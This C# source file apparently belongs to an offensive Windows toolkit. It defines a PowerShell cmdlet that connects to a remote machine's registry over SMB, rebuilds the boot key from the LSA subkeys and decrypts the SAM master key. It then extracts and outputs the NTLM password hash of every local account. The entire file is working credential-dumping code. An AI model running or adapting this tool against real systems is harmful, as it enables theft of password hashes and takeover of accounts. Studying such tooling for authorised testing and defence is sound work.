using System;
using System.Buffers.Binary;
using System.Collections.Generic;
using System.Collections.Immutable;
using System.Globalization;
using System.IO;
using System.Management.Automation;
using System.Net.Sockets;
using System.Security.Cryptography;
using System.Threading;
using Titanis;
using Titanis.Msrpc.Msrrp;
using Titanis.Msrpc.Msrrp.Cli;
using Titanis.Winterop;
using Titanis.Winterop.Sam;

namespace Titanis.Tbo.Smb2.PowerShell
{
	public sealed class TboRegSamHashInfo
	{
		public string ServerName { get; init; } = string.Empty;
		public string? AccountName { get; init; }
		public string? FullName { get; init; }
		public uint Rid { get; init; }
		public byte[]? NtlmHash { get; init; }
		public string? NtlmHashText { get; init; }
	}

	[Cmdlet(VerbsCommon.Get, "TBORegSamHashes")]
	[OutputType(typeof(TboRegSamHashInfo))]
	public sealed class GetTBORegSamHashes : TboRegCmdlet
	{
		private const string LsaKeyPath = @"SYSTEM\CurrentControlSet\Control\Lsa";
		private const string SamAccountPath = @"SAM\SAM\Domains\Account";
		private const string SamUsersPath = @"SAM\SAM\Domains\Account\Users";
		private const ulong BootKeyByteSwap = 0xEC6B4D50F91273A8;
		private static readonly string[] BootKeySubkeys = { "JD", "Skew1", "GBG", "Data" };
		private const int SamUserAttrCount = 17;
		private const int SamUserAttrInfoSize = 12;

		protected override void ProcessRecord(ISmbProviderInfo smb, CancellationToken cancellationToken)
		{
			ExecuteRegistryOperation(smb, cancellationToken, session =>
			{
				byte[]? syskey = null;
				SamStore? store = null;
				Dictionary<uint, string> nameLookup = new();
				try
				{
					syskey = ExtractSyskey(session.Client, cancellationToken);
					store = ExtractSamStore(smb, session.Client, syskey, cancellationToken);
					nameLookup = TryReadSamUserNames(smb, session.Client, cancellationToken);
				}
				catch (Exception ex) when (IsRetryableInitException(ex))
				{
					throw;
				}
				catch (Exception ex)
				{
					smb.LogException($"Get-TBORegSamHashes failed to initialize for {this.ServerName}", ex);
					this.WriteWarning($"Get-TBORegSamHashes failed to initialize: {ex.Message}");
				}

				if (store == null || !store.HasMasterKey)
					return;

				var usersSpec = new RegistryPathSpec(
					RegistryRootKey.LocalMachine,
					RemoteRegistryClient.GetRootName(RegistryRootKey.LocalMachine),
					SamUsersPath);

				List<RegistrySubkeyInfo> users;
				using var usersKey = OpenRegistryKey(session.Client, usersSpec, RegistryAccessRights.EnumerateSubkeys, cancellationToken);
				try
				{
					users = CollectSubkeys(usersKey, cancellationToken);
				}
				catch (Exception ex)
				{
					smb.LogException("Get-TBORegSamHashes failed to enumerate SAM users", ex);
					this.WriteWarning($"Get-TBORegSamHashes failed to enumerate SAM users: {ex.Message}");
					return;
				}

				foreach (var userKeyInfo in users)
				{
					var keyName = userKeyInfo.KeyName;
					if (string.Equals(keyName, "Names", StringComparison.OrdinalIgnoreCase))
						continue;

					if (!uint.TryParse(keyName, NumberStyles.HexNumber, CultureInfo.InvariantCulture, out var rid))
						continue;

					var userSpec = new RegistryPathSpec(
						usersSpec.RootKey,
						usersSpec.RootName,
						CombineSubkeyPath(usersSpec.SubkeyPath, keyName));

					try
					{
						using var userKey = OpenRegistryKey(session.Client, userSpec, RegistryAccessRights.QueryValue, cancellationToken);
						var valueInfo = userKey.GetValue("V", cancellationToken).GetAwaiter().GetResult();
						var bytes = ExtractValueBytes(valueInfo);
						if (bytes == null || bytes.Length == 0)
						{
							this.WriteWarning($"Get-TBORegSamHashes failed to read SAM user {keyName}: value is empty.");
							continue;
						}

						if (!TryValidateSamUserRecord(bytes, out var reason))
						{
							this.WriteWarning($"Get-TBORegSamHashes skipped SAM user {keyName}: {reason ?? "record is invalid"}.");
							continue;
						}

						var user = new SamUserRegistryObject(store, rid, ImmutableArray<byte>.Empty, ImmutableArray.Create(bytes));
						var ntHash = user.GetDecryptedNtHash();
						var accountName = user.AccountName;
						if (string.IsNullOrWhiteSpace(accountName) && nameLookup.TryGetValue(rid, out var mappedName))
							accountName = mappedName;

						this.WriteObject(new TboRegSamHashInfo
						{
							ServerName = this.ServerName,
							AccountName = accountName,
							FullName = user.FullName,
							Rid = rid,
							NtlmHash = ntHash,
							NtlmHashText = ntHash?.ToHexString()
						});
					}
					catch (Exception ex)
					{
						smb.LogException($"Get-TBORegSamHashes failed to read SAM user {keyName}", ex);
						this.WriteWarning($"Get-TBORegSamHashes failed to read SAM user {keyName}: {ex.Message}");
					}
				}
			});
		}

		private byte[] ExtractSyskey(IRegistryClient client, CancellationToken cancellationToken)
		{
			var lsaSpec = new RegistryPathSpec(
				RegistryRootKey.LocalMachine,
				RemoteRegistryClient.GetRootName(RegistryRootKey.LocalMachine),
				LsaKeyPath);

			using var lsaKey = OpenRegistryKey(client, lsaSpec, RegistryAccessRights.QueryValue, cancellationToken);

			byte[] syskey = new byte[16];
			ulong swapKey = BootKeyByteSwap;
			foreach (var subkeyName in BootKeySubkeys)
			{
				var subkeySpec = new RegistryPathSpec(
					lsaSpec.RootKey,
					lsaSpec.RootName,
					CombineSubkeyPath(lsaSpec.SubkeyPath, subkeyName));

				using var subkey = OpenRegistryKey(client, subkeySpec, RegistryAccessRights.QueryValue, cancellationToken);
				var info = subkey.QueryInfo(includeClass: true, cancellationToken).GetAwaiter().GetResult();
				var className = info.ClassName?.TrimEnd('\0');
				if (string.IsNullOrWhiteSpace(className))
					throw new InvalidOperationException($"Registry class for {subkeySpec.KeyPath} is empty.");

				var bytes = BinaryHelper.ParseHexString(className.AsSpan());
				if (bytes.Length < 4)
					throw new InvalidOperationException($"Registry class for {subkeySpec.KeyPath} does not contain 4 bytes.");

				for (int i = 0; i < 4; i++)
				{
					syskey[(int)(swapKey & 0x0F)] = bytes[i];
					swapKey >>= 4;
				}
			}

			return syskey;
		}

		private SamStore? ExtractSamStore(
			ISmbProviderInfo smb,
			IRegistryClient client,
			byte[] syskey,
			CancellationToken cancellationToken)
		{
			var accountSpec = new RegistryPathSpec(
				RegistryRootKey.LocalMachine,
				RemoteRegistryClient.GetRootName(RegistryRootKey.LocalMachine),
				SamAccountPath);

			using var accountKey = OpenRegistryKey(client, accountSpec, RegistryAccessRights.QueryValue, cancellationToken);
			var usersF = accountKey.GetValue("F", cancellationToken).GetAwaiter().GetResult();
			var fBytes = ExtractValueBytes(usersF);
			if (fBytes == null || fBytes.Length < 136)
			{
				this.WriteWarning("Get-TBORegSamHashes failed to read SAM account data: value is too short.");
				return null;
			}

			uint rev = BinaryPrimitives.ReadUInt32LittleEndian(fBytes.AsSpan(104, 4));
			if (rev != 2)
			{
				this.WriteWarning($"Get-TBORegSamHashes failed to read SAM account data: unsupported revision {rev}.");
				return null;
			}

			int cbData = BinaryPrimitives.ReadInt32LittleEndian(fBytes.AsSpan(116, 4));
			if (cbData <= 0 || 136 + cbData > fBytes.Length)
			{
				this.WriteWarning("Get-TBORegSamHashes failed to read SAM account data: encrypted payload is invalid.");
				return null;
			}

			byte[] salt = fBytes.AsSpan(120, 16).ToArray();
			byte[] data = fBytes.AsSpan(136, cbData).ToArray();

			try
			{
				using var aes = Aes.Create();
				aes.Key = syskey;
				var decryptedMasterKey = aes.DecryptCbc(data, salt);
				return new SamStore(decryptedMasterKey);
			}
			catch (Exception ex)
			{
				smb.LogException("Get-TBORegSamHashes failed to decrypt SAM account data", ex);
				this.WriteWarning($"Get-TBORegSamHashes failed to decrypt SAM account data: {ex.Message}");
			}

			return null;
		}

		private Dictionary<uint, string> TryReadSamUserNames(
			ISmbProviderInfo smb,
			IRegistryClient client,
			CancellationToken cancellationToken)
		{
			var results = new Dictionary<uint, string>();
			var namesSpec = new RegistryPathSpec(
				RegistryRootKey.LocalMachine,
				RemoteRegistryClient.GetRootName(RegistryRootKey.LocalMachine),
				CombineSubkeyPath(SamUsersPath, "Names"));

			try
			{
				using var namesKey = OpenRegistryKey(
					client,
					namesSpec,
					RegistryAccessRights.EnumerateSubkeys | RegistryAccessRights.QueryValue,
					cancellationToken);

				var subkeys = CollectSubkeys(namesKey, cancellationToken);
				foreach (var subkeyInfo in subkeys)
				{
					var name = subkeyInfo.KeyName;
					if (string.IsNullOrWhiteSpace(name))
						continue;

					var userSpec = new RegistryPathSpec(
						namesSpec.RootKey,
						namesSpec.RootName,
						CombineSubkeyPath(namesSpec.SubkeyPath, name));

					try
					{
						using var userKey = OpenRegistryKey(client, userSpec, RegistryAccessRights.QueryValue, cancellationToken);
						var valueInfo = userKey.GetValue(string.Empty, cancellationToken).GetAwaiter().GetResult();
						if (TryReadRid(valueInfo, out var rid))
							results[rid] = name;
					}
					catch (Exception ex)
					{
						smb.LogException($"Get-TBORegSamHashes failed to read SAM name entry {name}", ex);
					}
				}
			}
			catch (Exception ex)
			{
				smb.LogException("Get-TBORegSamHashes failed to read SAM user name map", ex);
			}

			return results;
		}

		private static byte[]? ExtractValueBytes(RegistryValueInfo info)
		{
			if (info.Bytes != null && info.Bytes.Length > 0)
				return info.Bytes;
			if (info.TypedValue is byte[] typedBytes && typedBytes.Length > 0)
				return typedBytes;
			return null;
		}

		private static bool TryReadRid(RegistryValueInfo info, out uint rid)
		{
			rid = 0;
			if (info.TypedValue is uint typedUint)
			{
				rid = typedUint;
				return true;
			}

			if (info.TypedValue is int typedInt && typedInt >= 0)
			{
				rid = (uint)typedInt;
				return true;
			}

			var bytes = ExtractValueBytes(info);
			if (bytes == null || bytes.Length < 4)
				return false;

			rid = BinaryPrimitives.ReadUInt32LittleEndian(bytes.AsSpan(0, 4));
			return true;
		}

		private static string? CombineSubkeyPath(string? basePath, string childName)
		{
			if (string.IsNullOrEmpty(basePath))
				return childName;
			if (string.IsNullOrEmpty(childName))
				return basePath;
			return $"{basePath}\\{childName}";
		}

		private static bool IsRetryableInitException(Exception ex)
		{
			if (ex is NtstatusException nt && nt.StatusCode == Ntstatus.STATUS_PIPE_BUSY)
				return true;
			if (ex is IOException or SocketException)
				return true;
			return ex.InnerException != null && IsRetryableInitException(ex.InnerException);
		}

		private static bool TryValidateSamUserRecord(byte[] bytes, out string? reason)
		{
			reason = null;
			int attrTableSize = SamUserAttrCount * SamUserAttrInfoSize;
			if (bytes.Length < attrTableSize)
			{
				reason = "value is too short for the attribute table";
				return false;
			}

			for (int i = 0; i < SamUserAttrCount; i++)
			{
				int offset = BinaryPrimitives.ReadInt32LittleEndian(bytes.AsSpan(i * SamUserAttrInfoSize, 4));
				int length = BinaryPrimitives.ReadInt32LittleEndian(bytes.AsSpan(i * SamUserAttrInfoSize + 4, 4));

				if (offset < 0 || length < 0)
				{
					reason = $"attribute {i} has a negative offset or length";
					return false;
				}

				if (offset == 0 && length == 0)
					continue;

				long end = (long)attrTableSize + offset + length;
				if (end > bytes.Length)
				{
					reason = $"attribute {i} is out of range";
					return false;
				}
			}

			return true;
		}
	}
}
